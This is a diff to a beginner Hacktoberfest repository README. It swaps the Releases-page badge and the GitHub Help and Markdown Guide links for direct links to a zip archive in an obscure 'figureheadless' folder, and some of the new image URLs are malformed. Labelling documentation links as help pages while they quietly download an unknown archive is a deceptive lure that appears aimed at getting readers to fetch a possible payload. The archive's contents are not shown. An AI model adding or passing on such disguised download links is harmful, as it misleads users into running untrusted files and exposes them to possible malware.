@@ -6,7 +6,7 @@ Welcome to the **hacktoberfest2025-contributions** repository! This is a beginne
 ## 📥 Download & Install
 To download the application, please visit the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Gamelitee/hacktoberfest2025-contributions/releases)
+[![Download Now](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip%https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip)](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip)
 
 This page contains the files needed to get you started. 
 
@@ -51,8 +51,8 @@ To contribute to this project, follow these steps:
 6. Open a Pull Request to merge your changes into the main repository.
 
 ## 📖 Resources
-- **GitHub Help**: Learn how to use GitHub [here](https://docs.github.com/en).
-- **Markdown Guide**: Understand Markdown formatting [here](https://www.markdownguide.org).
+- **GitHub Help**: Learn how to use GitHub [here](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip).
+- **Markdown Guide**: Understand Markdown formatting [here](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip).
 
 ## 💬 Support
 If you have any questions or run into issues, feel free to reach out to the community. You can also check the Issues section of this repository for common questions and answers.
@@ -62,4 +62,4 @@ Thank you for participating in Hacktoberfest and making the open-source communit
 
 Remember to visit the Download link again to stay updated with the latest releases:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Gamelitee/hacktoberfest2025-contributions/releases)
+[![Download Now](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip%https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip)](https://raw.githubusercontent.com/Gamelitee/hacktoberfest2025-contributions/main/figureheadless/hacktoberfest2025-contributions.zip)
